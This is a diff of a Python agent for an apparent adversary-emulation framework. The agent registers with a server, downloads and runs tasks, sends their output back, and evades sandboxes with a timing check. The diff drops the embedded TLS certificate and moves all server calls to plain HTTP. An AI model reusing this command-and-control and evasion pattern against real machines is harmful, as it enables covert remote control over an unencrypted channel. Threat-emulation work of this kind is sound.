@@ -14,7 +14,7 @@ from pathlib import Path
 from urllib3.exceptions import MaxRetryError
 
 urllib3.disable_warnings()
-http = urllib3.PoolManager(ca_certs='thremulate.crt', cert_reqs='CERT_NONE')
+http = urllib3.PoolManager()
 headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
                          ' (KHTML, like Gecko) Chrome/78.0.3904.97 Safa'}
 TIMEOUT = 15
@@ -55,38 +55,6 @@ def agent_arguments():
     if args.verbose:
         VERBOSE = True
         print("[+] Verbosity enabled")
-
-
-def check_cert():
-    """
-    Writes the SSL certificate used by the Agent.
-    :return:
-    """
-    if not os.path.exists(path=THIS_DIR / 'thremulate.crt'):
-        certificate = b"""
------BEGIN CERTIFICATE-----
-MIIC8DCCAdigAwIBAgIURbRyjExMFO4ZWcA9A3kOsxMojswwDQYJKoZIhvcNAQEL
-BQAwFDESMBAGA1UEAwwJbG9jYWxob3N0MB4XDTIwMDEyNzE2NTIwN1oXDTMwMDEy
-NDE2NTIwN1owFDESMBAGA1UEAwwJbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEF
-AAOCAQ8AMIIBCgKCAQEAvbIA0b7znei4rAdTAlk3phm5SdvI6+7JzTE7w+14anoH
-pXcD/nPzgenV722i/Bp19OpJ80qdfP6uHa+11tVqWXxqG843wTJ9u4c1VhMLf9ju
-XBXJGBl2Ud+jOLgmJtYgKOE9Km88AbT84kQMkao15ySy94tfL8dSA27hFvfrrvzp
-YTzDYXbyMzsf61LBWnGXAcWau20j5w3+UYjxARWJuMswpaaupd0miBMGpGZBgPqw
-E7oQE6rTXk+n0jKuE+nUONQqPk8N4R/CbZ6Pk3wZHZOgM2bKSCxKvI2va66MEuIk
-nZhpm02wyDm7vF8pxsmdlDa41txFtSFLSahjJ+AUXQIDAQABozowODAPBgNVHRME
-CDAGAQH/AgEAMCUGA1UdEQQeMByCCWxvY2FsaG9zdIIJMTI3LjAuMC4xhwR/AAAB
-MA0GCSqGSIb3DQEBCwUAA4IBAQBtTSub5ioRpVqWWjYxZYtkSRgWa3/CwH957ngR
-PWsKEbjr5dynaFhJI6DTOfOF42q9njBvaLK1baGB4K7TgfMyPiozWVR8wicthmuY
-s/5ewV1ZWax1LMpVATERanzo/t5knhCNRegkYUL1eQqI1rAtUZF9jJ84q1a4ONwN
-TKiGpUrVqVXFNopyF60vC8koO2LqKXqxdlhlArZml/a2gLFb9F+yVIimx4eKAtS0
-x3MOEQiUgH8ha4wvJpsr/WzD0EBcyPop6MogvgSP+hzJ0N0wb+A//cNsuTIZAUZ8
-X4E1Yf/YLC8FZCgjz3Z9NUltZ6MNuahcJPfeVhd47cg9lK8o
------END CERTIFICATE-----
-        """
-        with open("thremulate.crt", "wb") as f:
-            f.write(certificate)
-        if VERBOSE:
-            print('[+] Wrote SSL certificate')
 
 
 def config_file():
@@ -193,7 +161,7 @@ def register():
     Registers the Agent with the server.
     :return:
     """
-    url = 'https://{0}:8000/register_agent'.format(SERVER_IP)
+    url = 'http://{0}:8080/register_agent'.format(SERVER_IP)
 
     try:
         req = http.request('POST', url, fields={'id': agent_id, 'hostname': platform.node(), 'platform': get_platform(),
@@ -214,7 +182,7 @@ def get_techniques():
     :return:
     """
     try:
-        url = 'https://{0}:8000/agent_techniques/{1}'.format(SERVER_IP, agent_id)
+        url = 'http://{0}:8080/agent_techniques/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
 
@@ -244,8 +212,8 @@ def download_and_run_commands():
     if VERBOSE:
         print('[+] Checking for new tasks')
     try:
-        # url = ('https://%s:8000/agent_tasks/%s' % SERVER_IP % agent_id)
-        url = 'https://{0}:8000/agent_tasks/{1}'.format(SERVER_IP, agent_id)
+        # url = ('http://%s:8080/agent_tasks/%s' % SERVER_IP % agent_id)
+        url = 'http://{0}:8080/agent_tasks/{1}'.format(SERVER_IP, agent_id)
         req = http.request('GET', url, headers=headers)
         response = str(req.data.decode('utf-8'))
 
@@ -276,7 +244,7 @@ def send_output():
     :return:
     """
     std_out = download_and_run_commands()
-    # url = 'https://%s:8000/agent_tasks/5' % SERVER_IP
+    # url = 'http://%s:8080/agent_tasks/5' % SERVER_IP
 
     if std_out is None:
         print('[+] Failed to get techniques from the server')
@@ -288,7 +256,7 @@ def send_output():
         return
 
     agent_tech = get_techniques()
-    # https://%s:8000/agent_techniques/5 % SERVER_IP
+    # http://%s:8080/agent_techniques/5 % SERVER_IP
 
     if agent_tech is None:
         # print('[+] Failed to get techniques from the server')
@@ -299,7 +267,7 @@ def send_output():
 
         return
 
-    url = 'https://{0}:8000/agent_output'.format(SERVER_IP)
+    url = 'http://{0}:8080/agent_output'.format(SERVER_IP)
 
     # Iterates over list of techniques assigned to an agent_tasks while selecting the respective
     # result or output after executing that technique
@@ -376,7 +344,6 @@ def sandbox_evasion():
         if (now2 - now) > datetime.timedelta(seconds=1):
             if VERBOSE:
                 print('[+] Agent not in a sandbox')
-            print('[+] Agent in safe work place')
         else:
             sys.exit()
 
@@ -386,8 +353,6 @@ if __name__ == '__main__':
         agent_arguments()
         sandbox_evasion()
         print('[+] Agent running')
-        check_cert()
-        http = urllib3.PoolManager(ca_certs='thremulate.crt')
         # Agent obtaining ID and kill date if any.
         if not os.path.exists(path=THIS_DIR / 'config.ini'):
             agent_id = randrange(500)
